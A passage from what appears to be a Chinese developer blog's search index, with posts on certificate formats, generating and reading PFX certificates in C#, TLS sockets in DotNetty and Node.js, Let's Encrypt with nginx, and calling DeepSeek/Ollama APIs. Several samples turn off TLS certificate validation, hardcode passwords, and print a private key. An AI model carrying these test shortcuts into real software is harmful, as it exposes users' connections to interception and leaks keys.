为文件扩展名。DER 格式的证书不包含任何文本标签，因此文件体积相对较小，但不能直接查看内容。 应用场景：在 Java 平台和一些硬件设备中使用较为广泛。例如，Java 中的 KeyStore 通常可以使用 DER 格式的证书。 特点：二进制格式，适合机器处理，不便于人工阅读。\nCER 证书 简介：CER 证书也是一种 X.509 证书的文件格式，它在 Windows 系统中较为常见，通常用于存储公钥证书。CER 文件可以是二进制（DER 编码）或文本（PEM 编码）格式。 应用场景：常用于 Windows 系统的应用程序，如 Internet Explorer 浏览器在验证网站证书时会处理 CER 格式的证书。 特点：在 Windows 系统中方便导入和使用。\nJKS 证书 简介：JKS（Java KeyStore）是 Java 平台特有的证书存储格式，它是一个二进制文件，用于存储 Java 应用程序使用的密钥和证书。JKS 文件使用密码进行保护，包含了私钥、公钥证书和信任的证书。 应用场景：专门用于 Java 应用程序，如 Java Web 服务器（如 Tomcat）、Java 客户端应用等。在 Java 应用中，通常使用 KeyStore 类来管理 JKS 文件。 特点：与 Java 平台紧密集成，方便 Java 开发者使用。\nPKCS #7 证书 简介：PKCS #7（Public - Key Cryptography Standards #7）是一种用于封装数字签名和加密数据的标准，PKCS #7 证书通常以 .p7b 或 .p7c 为文件扩展名。它可以包含证书链，但不包含私钥，主要用于验证数字签名和传递证书信息。 应用场景：常用于电子邮件安全、软件分发等领域，用于传递和验证证书链。例如，在 Outlook 等邮件客户端中，可以使用 PKCS #7 格式的证书来验证邮件的数字签名。 特点：主要用于传递证书信息和验证签名，不包含私钥，安全性较高\n","permalink":"https://qfsyso.github.io/posts/p12-certificates/","summary":"P12 证书 P12 证书，也称为 PFX 证书（在 Windows 系统中常用 PFX 扩展名，而在其他一些系统中常用 P12 扩展名），其全称为 Personal Information Exchange。它是一种用于存储个人身份信息和加密密钥的文件格式，通常采用 PKCS #12 标准。P12 证书文件包含了公钥、私钥以及证书链，能够保证数据在传输和存储过程中的安全性和完整性，广泛应用于 SSL/TLS 加密、代码签名、数字身份验证等场景。\nP12 证书的特点 综合性：同时包含了公钥、私钥和证书链，方便在不同系统和应用中进行部署和使用。 加密性：使用密码对私钥进行加密保护，只有知道密码的用户才能访问私钥，提高了私钥的安全性。 跨平台性：可以在多种操作系统和应用程序中使用，如 Windows、Linux、macOS 等。\n在 C# 中处理 P12 证书 3.1 生成 P12 证书 以下是一个在 C# 中生成 P12 证书的示例代码：\nusing System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( \u0026#34;CN=MySelfSignedCertificate\u0026#34;, rsa, HashAlgorithmName.","title":"p12 certificates"},{"content":"C#生成证书 在 C# 中生成 .pfx 证书文件，通常可以借助 System.Security.Cryptography 命名空间下的类来实现。以下为详细步骤和示例代码：\n创建自签名证书 利用 RSA 算法生成密钥对，再使用 CertificateRequest 类创建自签名证书请求，最后生成自签名证书。 将证书保存为 .pfx 文件：使用 X509Certificate2 类把生成的证书和私钥保存为 .pfx 文件。\npusing System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( \u0026#34;CN=MySelfSignedCertificate\u0026#34;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // 设置证书扩展 certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // 生成自签名证书 var certificate = certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)); // 保存为PFX文件 string pfxFilePath = \u0026#34;MyCertificate.pfx\u0026#34;; string pfxPassword = \u0026#34;MyPassword123\u0026#34;; byte[] pfxBytes = certificate.Export(X509ContentType.Pfx, pfxPassword); File.WriteAllBytes(pfxFilePath, pfxBytes); Console.WriteLine($\u0026#34;PFX文件已生成: {pfxFilePath}\u0026#34;); } } } 生成 RSA 密钥对： csharpusing (RSA rsa = RSA.Create(2048)) { // \u0026hellip; } 运用 RSA.Create(2048) 方法生成一个 2048 位的 RSA 密钥对。\n创建证书请求： csharpvar certificateRequest = new CertificateRequest( \u0026ldquo;CN=MySelfSignedCertificate\u0026rdquo;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); 借助 CertificateRequest 类创建一个证书请求，指定证书的主题名称、密钥对、哈希算法和签名填充方式。\n设置证书扩展： csharpcertificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); 为证书请求添加基本约束和密钥使用扩展。\n生成自签名证书： csharpvar certificate = certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)); 调用 CreateSelfSigned 方法生成自签名证书，指定证书的有效期。\n保存为 .pfx 文件： csharpstring pfxFilePath = \u0026ldquo;MyCertificate.pfx\u0026rdquo;; string pfxPassword = \u0026ldquo;MyPassword123\u0026rdquo;; byte[] pfxBytes = certificate.Export(X509ContentType.Pfx, pfxPassword); File.WriteAllBytes(pfxFilePath, pfxBytes); 使用 Export 方法将证书和私钥导出为 .pfx 格式的字节数组，再使用 File.WriteAllBytes 方法将字节数组保存为文件。\n注意事项 要保证运行代码的用户对保存 .pfx 文件的目录具有写入权限。 妥善保管 .pfx 文件和密码，因为 .pfx 文件包含私钥，泄露私钥会带来安全风险。\n读取 using System; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { try { // .pfx 证书文件的路径 string pfxFilePath = \u0026#34;MyCertificate.pfx\u0026#34;; // .pfx 证书文件的密码 string pfxPassword = \u0026#34;MyPassword123\u0026#34;; // 读取 .pfx 证书文件 using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) { // 输出证书的基本信息 Console.WriteLine(\u0026#34;证书信息：\u0026#34;); Console.WriteLine($\u0026#34;主题: {certificate.Subject}\u0026#34;); Console.WriteLine($\u0026#34;颁发者: {certificate.Issuer}\u0026#34;); Console.WriteLine($\u0026#34;有效期开始时间: {certificate.NotBefore}\u0026#34;); Console.WriteLine($\u0026#34;有效期结束时间: {certificate.NotAfter}\u0026#34;); Console.WriteLine($\u0026#34;指纹: {certificate.Thumbprint}\u0026#34;); // 检查证书是否包含私钥 if (certificate.HasPrivateKey) { Console.WriteLine(\u0026#34;证书包含私钥。\u0026#34;); } else { Console.WriteLine(\u0026#34;证书不包含私钥。\u0026#34;); } } } catch (Exception ex) { Console.WriteLine($\u0026#34;读取证书时出错: {ex.Message}\u0026#34;); } } } socket ssl DotNettySocket 服务端代码的基础上添加 SSL/TLS 加密支持。DotNetty 支持 SSL/TLS，可以使用 TlsHandler 来实现。需要做以下修改：\n准备 SSL 证书（.pfx 文件）。 在 TcpSocketServerBuilder 里添加 SSL 处理器。 确保客户端也支持 SSL 连接，否则连接会失败。 修改 TcpSocketServerBuilder 代码 在 ChildHandler 的 ActionChannelInitializer 里添加 TlsHandler，示例如下：\nusing System.Security.Cryptography.X509Certificates; using DotNetty.Handlers.Tls; public ITcpSocketServerBuilder UseSsl(string certPath, string certPassword) { _setEncoder += x =\u0026gt; { var certificate = new X509Certificate2(certPath, certPassword); x.AddFirst(\u0026#34;tls\u0026#34;, new TlsHandler( stream =\u0026gt; new SslStream(stream, true), new ServerTlsSettings(certificate) )); }; return this; } 修改 Main 里的 SocketBuilderFactory 在 BuildAsync() 之前调用 UseSsl：\nvar theServer = await SocketBuilderFactory.GetTcpSocketServerBuilder(6001) .UseSsl(\u0026#34;server.pfx\u0026#34;, \u0026#34;yourpassword\u0026#34;) // 添加 SSL 支持 .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .OnConnectionClose((server, connection) =\u0026gt; { //... }).BuildAsync(); 说明： UseSsl(\u0026ldquo;server.pfx\u0026rdquo;, \u0026ldquo;yourpassword\u0026rdquo;) 需要的证书文件 server.pfx 和密码。 TlsHandler 处理 SSL/TLS 连接。 客户端也需要对应的 SSL 处理，否则无法连接。 这样，服务端就支持 SSL 加密了，客户端需要使用 SslStream 进行加密连接。如果的客户端也是基于 DotNetty，需要在 TcpSocketClientBuilder 里添加 TlsHandler，方式类似。\nnode socket client const tls = require(\u0026#39;tls\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const CERT_PATH = \u0026#39;C:/path/to/MyCertificate.pfx\u0026#39;; const CERT_PASS = \u0026#39;your_password\u0026#39;; const options = { pfx: fs.readFileSync(CERT_PATH), passphrase: CERT_PASS, rejectUnauthorized: false, // 允许自签名证书 }; const client = tls.connect(6001, \u0026#39;127.0.0.1\u0026#39;, options, () =\u0026gt; { console.log(\u0026#39;✅ 已连接到服务器\u0026#39;); sendData(); }); // 监听服务器数据 client.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { console.log(\u0026#39;📩 收到服务器数据:\u0026#39;, data.toString()); }); // 监听错误 client.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.error(\u0026#39;❌ 连接错误:\u0026#39;, err.message); }); // 监听关闭 client.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(\u0026#39;🔴 连接已断开\u0026#39;); }); // **封装函数，确保数据格式正确** function sendData() { setInterval(() =\u0026gt; { if (client.writable) { const message = `➡️ 发送数据: ${new Date().toISOString()}`; const msgBuffer = Buffer.from(message, \u0026#39;utf-8\u0026#39;); // **前两个字节存储消息长度** const lengthBuffer = Buffer.alloc(2); lengthBuffer.writeUInt16BE(msgBuffer.length, 0); // **拼接长度字段 + 数据** const finalBuffer = Buffer.concat([lengthBuffer, msgBuffer]); console.log(\u0026#39;📤 发送数据:\u0026#39;, message); client.write(finalBuffer); } else { console.log(\u0026#39;⚠️ 连接已关闭，无法发送数据\u0026#39;); } }, 1000); } socket server using Coldairarrow.DotNettySocket; using DotNetty.Handlers.Tls; using System; using System.IO; using System.Net; using System.Security.Cryptography.X509Certificates; using System.Text; using System.Threading.Tasks; namespace TcpSocket.Server { class Program { static async Task Main(string[] args) { // 加载证书 var serverCertificate = new X509Certificate2(Path.Combine(AppContext.BaseDirectory, \u0026#34;your_certificate.pfx\u0026#34;), \u0026#34;your_password\u0026#34;); var theServer = await SocketBuilderFactory.GetTcpSocketServerBuilder(6001) .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .SetSslHandler(serverCertificate) // 添加 SSL 处理器 .OnConnectionClose((server, connection) =\u0026gt; { Console.WriteLine($\u0026#34;连接关闭,连接名[{connection.ConnectionName}],当前连接数:{server.GetConnectionCount()}\u0026#34;); }) .OnException(ex =\u0026gt; { Console.WriteLine($\u0026#34;服务端异常:{ex.Message}\u0026#34;); }) .OnNewConnection((server, connection) =\u0026gt; { connection.ConnectionName = $\u0026#34;名字{connection.ConnectionId}\u0026#34;; Console.WriteLine($\u0026#34;新的连接[{connection.ClientAddress.Address.MapToIPv4().ToString()}]:{connection.ConnectionName},当前连接数:{server.GetConnectionCount()}\u0026#34;); }) .OnRecieve((server, connection, bytes) =\u0026gt; { Console.WriteLine($\u0026#34;服务端:数据{Encoding.UTF8.GetString(bytes)}\u0026#34;); connection.Send(bytes); }) .OnSend((server, connection, bytes) =\u0026gt; { Console.WriteLine($\u0026#34;向连接名[{connection.ConnectionName}]发送数据:{Encoding.UTF8.GetString(bytes)}\u0026#34;); }) .OnServerStarted(server =\u0026gt; { Console.WriteLine($\u0026#34;服务启动\u0026#34;); }).BuildAsync(); Console.ReadLine(); } } public static class TcpSocketServerBuilderExtensions { public static ITcpSocketServerBuilder SetSslHandler(this ITcpSocketServerBuilder builder, X509Certificate2 serverCertificate) { var tcpBuilder = builder as TcpSocketServerBuilder; tcpBuilder._setEncoder += x =\u0026gt; { x.AddLast(\u0026#34;tls\u0026#34;, new TlsHandler(stream =\u0026gt; new System.Net.Security.SslStream(stream, true, (sender, receivedCertificate, chain, errors) =\u0026gt; true), new DotNetty.Handlers.Tls.ServerTlsSettings(serverCertificate))); }; return builder; } } } socket client using Coldairarrow.DotNettySocket; using DotNetty.Handlers.Tls; using System; using System.IO; using System.Net.Security; using System.Security.Cryptography.X509Certificates; using System.Text; using System.Threading.Tasks; namespace TcpSocket.Client { class Program { static async Task Main(string[] args) { // 加载客户端证书 var clientCertificate = new X509Certificate2(Path.Combine(AppContext.BaseDirectory, \u0026#34;your_certificate.pfx\u0026#34;), \u0026#34;your_password\u0026#34;); var theClient = await SocketBuilderFactory.GetTcpSocketClientBuilder(\u0026#34;127.0.0.1\u0026#34;, 6001) .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .SetSslHandler(clientCertificate) // 添加 SSL 处理器并传入客户端证书 .OnClientStarted(client =\u0026gt; { Console.WriteLine($\u0026#34;客户端启动\u0026#34;); }) .OnClientClose(client =\u0026gt; { Console.WriteLine($\u0026#34;客户端关闭\u0026#34;); }) .OnException(ex =\u0026gt; { Console.WriteLine($\u0026#34;异常:{ex.Message}\u0026#34;); }) .OnRecieve((client, bytes) =\u0026gt; { Console.WriteLine($\u0026#34;客户端:收到数据:{Encoding.UTF8.GetString(bytes)}\u0026#34;); }) .OnSend((client, bytes) =\u0026gt; { Console.WriteLine($\u0026#34;客户端:发送数据:{Encoding.UTF8.GetString(bytes)}\u0026#34;); }) .BuildAsync(); while (true) { await theClient.Send(Guid.NewGuid().ToString()); await Task.Delay(1000); } } } public static class TcpSocketClientBuilderExtensions { public static ITcpSocketClientBuilder SetSslHandler(this ITcpSocketClientBuilder builder, X509Certificate2 clientCertificate) { var tcpBuilder = builder as TcpSocketClientBuilder; tcpBuilder._setEncoder += x =\u0026gt; { var clientTlsSettings = new DotNetty.Handlers.Tls.ClientTlsSettings(\u0026#34;localhost\u0026#34;, new[] { clientCertificate }); x.AddLast(\u0026#34;tls\u0026#34;, new TlsHandler(stream =\u0026gt; new System.Net.Security.SslStream(stream, true, (sender, receivedCertificate, chain, errors) =\u0026gt; { // 这里可以添加更严格的证书验证逻辑 return true; }), clientTlsSettings)); }; return builder; } } } 注意 AddLast or x.AddFirst(\u0026ldquo;tls\u0026rdquo; nodejs clint const tls = require(\u0026#39;tls\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); // 服务器地址和端口 const SERVER_HOST = \u0026#39;127.0.0.1\u0026#39;; // 服务器 IP 地址 const SERVER_PORT = 6001; // 服务器端口 // 读取 .pfx 证书 const options = { pfx: fs.readFileSync(\u0026#39;MyCertificate.pfx\u0026#39;), // 的 PFX 证书文件 passphrase: \u0026#39;MyPassword123\u0026#39;, // 证书密码，和服务端一致 rejectUnauthorized: false // 允许自签名证书（生产环境建议提供 CA 证书） }; // 创建 TLS 连接 const client = tls.connect(SERVER_PORT, SERVER_HOST, options, () =\u0026gt; { console.log(\u0026#39;✅ 成功连接到服务器\u0026#39;); // 发送测试消息 sendMessage(\u0026#39;Hello from Node.js TLS Client\u0026#39;); }); // 监听数据接收 client.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { console.log(`📩 收到服务器消息: ${data.toString()}`); }); // 监听错误 client.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.error(`❌ 连接错误: ${err.message}`); }); client.on(\u0026#39;close\u0026#39;, () =\u0026gt; { console.log(\u0026#39;🔴 连接已关闭\u0026#39;); }); // 监听连接关闭 client.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(\u0026#39;🔴 服务器已断开连接\u0026#39;); }); // 发送消息时，加上 2 字节的长度前缀 function sendMessage(message) { const msgBuffer = Buffer.from(message, \u0026#39;utf-8\u0026#39;); const lengthBuffer = Buffer.alloc(2); // 2 字节长度 lengthBuffer.writeUInt16BE(msgBuffer.length, 0); // 大端序写入长度 const finalBuffer = Buffer.concat([lengthBuffer, msgBuffer]); // 拼接长度和消息 client.write(finalBuffer); } // client.setTimeout(5000); // 设置超时 5 秒 // client.on(\u0026#39;timeout\u0026#39;, () =\u0026gt; { // console.error(\u0026#39;⏳ 连接超时，服务器可能未启动或端口不对\u0026#39;); // client.destroy(); // }); c# read using System; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { try { // .pfx 证书文件的路径 string pfxFilePath = \u0026#34;MyCertificate.pfx\u0026#34;; // .pfx 证书文件的密码 string pfxPassword = \u0026#34;MyPassword123\u0026#34;; // 读取 .pfx 证书文件 using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) { // 输出证书的基本信息 Console.WriteLine(\u0026#34;证书信息：\u0026#34;); Console.WriteLine($\u0026#34;主题: {certificate.Subject}\u0026#34;); Console.WriteLine($\u0026#34;颁发者: {certificate.Issuer}\u0026#34;); Console.WriteLine($\u0026#34;有效期开始时间: {certificate.NotBefore}\u0026#34;); Console.WriteLine($\u0026#34;有效期结束时间: {certificate.NotAfter}\u0026#34;); Console.WriteLine($\u0026#34;指纹: {certificate.Thumbprint}\u0026#34;); // 检查证书是否包含私钥 if (certificate.HasPrivateKey) { Console.WriteLine(\u0026#34;证书包含私钥。\u0026#34;); } else { Console.WriteLine(\u0026#34;证书不包含私钥。\u0026#34;); } } } catch (Exception ex) { Console.WriteLine($\u0026#34;读取证书时出错: {ex.Message}\u0026#34;); } } } //其他信息 Console.WriteLine($\u0026#34;证书版本: {certificate.Version}\u0026#34;); Console.WriteLine($\u0026#34;证书序列号: {certificate.SerialNumber}\u0026#34;); Console.WriteLine($\u0026#34;公钥: {certificate.PublicKey.Key.ToXmlString(false)}\u0026#34;); Console.WriteLine($\u0026#34;证书指纹: {certificate.Thumbprint}\u0026#34;); using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) { foreach (X509Extension extension in certificate.Extensions) { if (extension.Oid.FriendlyName == \u0026#34;Subject Alternative Name\u0026#34;) { X509SubjectAlternativeNameExtension sanExtension = (X509SubjectAlternativeNameExtension)extension; Console.WriteLine(\u0026#34;主题备用名称扩展信息:\u0026#34;); foreach (string name in sanExtension.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)) { Console.WriteLine(name); } } } } //私钥 if (certificate.HasPrivateKey) { Console.WriteLine(\u0026#34;证书包含私钥。\u0026#34;); // 这里假设私钥是 RSA 类型 if (certificate.PrivateKey is RSACryptoServiceProvider rsa) { Console.WriteLine($\u0026#34;私钥信息: {rsa.ToXmlString(true)}\u0026#34;); } } else { Console.WriteLine(\u0026#34;证书不包含私钥。\u0026#34;); } END\n","permalink":"https://qfsyso.github.io/posts/socket-ssl-tls/","summary":"C#生成证书 在 C# 中生成 .pfx 证书文件，通常可以借助 System.Security.Cryptography 命名空间下的类来实现。以下为详细步骤和示例代码：\n创建自签名证书 利用 RSA 算法生成密钥对，再使用 CertificateRequest 类创建自签名证书请求，最后生成自签名证书。 将证书保存为 .pfx 文件：使用 X509Certificate2 类把生成的证书和私钥保存为 .pfx 文件。\npusing System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( \u0026#34;CN=MySelfSignedCertificate\u0026#34;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // 设置证书扩展 certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // 生成自签名证书 var certificate = certificateRequest.","title":" socket ssl tls "},{"content":"申请证书 （1）申请证书之前，需要准备好用于绑定证书的域名（假如您的域名是：abc.dm.com）。这个域名必须能够正常访问，也就是说通过浏览器可以正常访问：http://abc.dm.com 。\n（2）打开网站： 来此加密 - Let\u0026rsquo;s Encrypt 在线免费申请SSL证书 https://letsencrypt.osfipin.com/\n（3）点“立即开始”，注册用户。（如果已注册用户，直接点“登录”）\n（4）登录之后，选择“申请证书”，之后照着申请证书的指引，一步步完成证书的申请。一般来说，直接按照默认的选项申请就行。\n（5）提交申请成功之后，还要进行一次手工验证。验证方式建议选择DNS验证。如下图所示：\n（6）在您的域名管理网站，根据系统提示的DNS验证资料，添加一条TXT域名解析记录，完成之后，点击验证。等待验证通过之后证书就申请到手啦。\nOR HTTPS验证\n刷新 下载证书\n修改nginx配置 server { listen 80; # listen [::]:80; server_name test1.xx.xyz; root /var/www/html; index index.html; location / { root html; index index.html index.htm; } } server { listen 443 ssl; server_name test1.xx.xyz; ssl_stapling on; ssl_stapling_verify on; ssl_certificate /var/www/cert/fullchain.crt; ssl_certificate_key /var/www/cert/private.pem; location / { root /var/www/html; index index.html index.htm; } } sudo systemctl restart nginx 访问https 如果正确访问则部署成功\n","permalink":"https://qfsyso.github.io/posts/free-https-ssl/","summary":"申请证书 （1）申请证书之前，需要准备好用于绑定证书的域名（假如您的域名是：abc.dm.com）。这个域名必须能够正常访问，也就是说通过浏览器可以正常访问：http://abc.dm.com 。\n（2）打开网站： 来此加密 - Let\u0026rsquo;s Encrypt 在线免费申请SSL证书 https://letsencrypt.osfipin.com/\n（3）点“立即开始”，注册用户。（如果已注册用户，直接点“登录”）\n（4）登录之后，选择“申请证书”，之后照着申请证书的指引，一步步完成证书的申请。一般来说，直接按照默认的选项申请就行。\n（5）提交申请成功之后，还要进行一次手工验证。验证方式建议选择DNS验证。如下图所示：\n（6）在您的域名管理网站，根据系统提示的DNS验证资料，添加一条TXT域名解析记录，完成之后，点击验证。等待验证通过之后证书就申请到手啦。\nOR HTTPS验证\n刷新 下载证书\n修改nginx配置 server { listen 80; # listen [::]:80; server_name test1.xx.xyz; root /var/www/html; index index.html; location / { root html; index index.html index.htm; } } server { listen 443 ssl; server_name test1.xx.xyz; ssl_stapling on; ssl_stapling_verify on; ssl_certificate /var/www/cert/fullchain.crt; ssl_certificate_key /var/www/cert/private.pem; location / { root /var/www/html; index index.html index.htm; } } sudo systemctl restart nginx 访问https 如果正确访问则部署成功","title":"free https ssl"},{"content":"DeepSeek DeepSeek是杭州深度求索人工智能技术有限公司推出的人工智能项目，涵盖公司品牌、人工智能模型及相关 AI 工具等多层含义，以下是具体介绍： 公司层面DeepSeek 是一家 2023 年 5 月成立的中国人工智能公司，由对冲基金公司 High-Flyer 出资成立。其创始人梁文峰带领团队专注于人工智能基础技术研究与开发，在人工智能领域尤其是大语言模型方向投入了大量研究资源并取得成果。 模型层面 DeepSeek Coder：2023 年 11 月 2 日发布，是完全开源且可免费用于商业用途的模型，为开发者提供了基础的代码生成等能力支持。 DeepSeek LLM：2023 年 11 月 29 日推出，具有 670 亿参数，性能与当时的 GPT-4 接近，同时推出了聊天版本 DeepSeek Chat。 DeepSeek V2：2024 年 5 月发布，以性价比高而闻名，每百万输出 tokens 仅需 2 元人民币，在 LLM 排名中位列第七。 DeepSeek R1-lite-preview：2024 年 11 月发布，擅长逻辑推理、数学推理和实时问题解决，在一些基准测试中声称超越了 OpenAI O1，但也有测试显示存在速度等方面的挑战。 DeepSeek V3：2024 年 12 月发布，拥有 6710 亿参数，训练仅花费 558 万美元，约 55 天时间，在基准测试中性能优于 Llama 3.1 和 Qwen 2.5，与 GPT-4 O 和 Claude 3.5 Sonnet 相当。 DeepSeek R1 和 DeepSeek R1-zero：2025 年 1 月发布，R1 模型是开源的，可让任何开发者使用，在一些关键的数学和编程测试中表现出色，能与 OpenAI 的先进模型相媲美或超越。 工具层面DeepSeek 作为 AI 工具，具有强大的自然语言处理能力，可进行知识问答、文本生成、数据分析、代码编写等多种任务，还支持多模态输入和联网搜索，能实时获取最新信息。广泛应用于教育、编程、内容创作、智能客服等领域，为用户提供高效、智能的解决方案。\nDeepSeek的官方网站地址 https://www.deepseek.com/ APP https://download.deepseek.com/app/ WebUI https://chat.deepseek.com/ API文档 https://api-docs.deepseek.com/zh-cn/\n服务状态 https://status.deepseek.com/\n本地运行 ollama run deepseek-r1 or\nollama run deepseek-r1:1.5b curl http://localhost:11434/api/generate -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;deepseek-r1:1.5b\u0026#34;, \u0026#34;prompt\u0026#34;: \u0026#34;Why is the sky blue?\u0026#34; }\u0026#39; https://github.com/ollama/ollama/blob/main/docs/api.md\npython python # Please install OpenAI SDK first: `pip3 install openai` from openai import OpenAI client = OpenAI(api_key=\u0026#34;\u0026lt;DeepSeek API Key\u0026gt;\u0026#34;, base_url=\u0026#34;https://api.deepseek.com\u0026#34;) response = client.chat.completions.create( model=\u0026#34;deepseek-chat\u0026#34;, messages=[ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Hello\u0026#34;}, ], stream=False ) print(response.choices[0].message.content) 注意model=\u0026lsquo;deepseek-chat\u0026rsquo;调用的是DeepSeek-V3模型，model=\u0026lsquo;deepseek-reasoner\u0026rsquo;才是DeepSeek-R1大模型。\ncsharp 要使用C#开发一个与Ollama API进行对话的程序，首先需要确保已经安装了Ollama并且它正在运行。Ollama通常会在本地提供一个REST API，可以通过HTTP请求与它进行交互。\n以下是一个简单的C#示例，展示如何使用HttpClient与Ollama API进行交互，并获取模型标签（如/api/tags）。\n1. 创建C#控制台应用程序 首先，创建一个新的C#控制台应用程序项目。\ndotnet new console -n OllamaChat cd OllamaChat 2. 添加必要的NuGet包 需要添加System.Net.Http包来处理HTTP请求。如果使用的是.NET Core 3.1或更高版本，System.Net.Http已经包含在SDK中，无需额外安装。\n3. 编写代码 在Program.cs中编写以下代码：\nusing System; using System.Net.Http; using System.Text; using System.Threading.Tasks; class Program { static async Task Main(string[] args) { // Ollama API的URL string ollamaApiUrl = \u0026#34;http://localhost:11434/api/tags\u0026#34;; // 创建HttpClient实例 using (HttpClient client = new HttpClient()) { try { // 发送GET请求获取模型标签 HttpResponseMessage response = await client.GetAsync(ollamaApiUrl); // 确保请求成功 response.EnsureSuccessStatusCode(); // 读取响应内容 string responseBody = await response.Content.ReadAsStringAsync(); // 输出响应内容 Console.WriteLine(\u0026#34;Response from Ollama API:\u0026#34;); Console.WriteLine(responseBody); } catch (HttpRequestException e) { // 处理请求异常 Console.WriteLine(\u0026#34;\\nException Caught!\u0026#34;); Console.WriteLine(\u0026#34;Message :{0} \u0026#34;, e.Message); } } } } 4. 运行程序 确保Ollama正在运行，并且API端点http://localhost:11434/api/tags是可访问的。然后运行的C#程序：\ndotnet run 5. 解释代码 HttpClient: 用于发送HTTP请求和接收HTTP响应。\nGetAsync: 发送一个GET请求到指定的URL。\nEnsureSuccessStatusCode: 确保HTTP响应是成功的（状态码200-299）。\nReadAsStringAsync: 读取响应内容为字符串。\nResponse from Ollama API: {\u0026ldquo;models\u0026rdquo;:[{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;deepseek-r1:7b\u0026rdquo;,\u0026ldquo;model\u0026rdquo;:\u0026ldquo;deepseek-r1:7b\u0026rdquo;,\u0026ldquo;modified_at\u0026rdquo;:\u0026ldquo;2025-02-04T62xxxxxxxx}}]}\nC# 调用 Ollama API 进行对话 包括获取模型列表和进行对话。 使用 HttpClient 发送 HTTP 请求，并解析返回的 JSON 数据。\nusing System; using System.Net.Http; using System.Text; using System.Text.Json; using System.Threading.Tasks; class Program { private static readonly string BaseUrl = \u0026#34;http://1.1.1.1:11434\u0026#34;; static async Task Main() { Console.WriteLine(\u0026#34;获取可用模型列表...\u0026#34;); var models = await GetModelList(); Console.WriteLine($\u0026#34;模型列表: {string.Join(\u0026#34;, \u0026#34;, models)}\u0026#34;); if (models.Length == 0) { Console.WriteLine(\u0026#34;没有可用的模型！\u0026#34;); return; } string model = models[0]; // 选择第一个模型 Console.WriteLine($\u0026#34;使用模型: {model}\u0026#34;); while (true) { Console.Write(\u0026#34;: \u0026#34;); string userInput = Console.ReadLine(); if (string.IsNullOrWhiteSpace(userInput)) break; string response = await ChatWithOllama(model, userInput); Console.WriteLine($\u0026#34;Ollama: {response}\u0026#34;); } } // 获取可用模型列表 static async Task\u0026lt;string[]\u0026gt; GetModelList() { using HttpClient client = new(); HttpResponseMessage response = await client.GetAsync($\u0026#34;{BaseUrl}/api/tags\u0026#34;); if (!response.IsSuccessStatusCode) { Console.WriteLine(\u0026#34;获取模型列表失败\u0026#34;); return Array.Empty\u0026lt;string\u0026gt;(); } string json = await response.Content.ReadAsStringAsync(); using JsonDocument doc = JsonDocument.Parse(json); var models = doc.RootElement.GetProperty(\u0026#34;models\u0026#34;); string[] modelNames = new string[models.GetArrayLength()]; for (int i = 0; i \u0026lt; models.GetArrayLength(); i++) { modelNames[i] = models[i].GetProperty(\u0026#34;name\u0026#34;).GetString(); } return modelNames; } // 发送对话请求 static async Task\u0026lt;string\u0026gt; ChatWithOllama(string model, string prompt) { using HttpClient client = new(); var requestBody = new { model = model, prompt = prompt, stream = false }; string jsonRequest = JsonSerializer.Serialize(requestBody); var content = new StringContent(jsonRequest, Encoding.UTF8, \u0026#34;application/json\u0026#34;); HttpResponseMessage response = await client.PostAsync($\u0026#34;{BaseUrl}/api/generate\u0026#34;, content); if (!response.IsSuccessStatusCode) { return \u0026#34;对话请求失败\u0026#34;; } string jsonResponse = await response.Content.ReadAsStringAsync(); using JsonDocument doc = 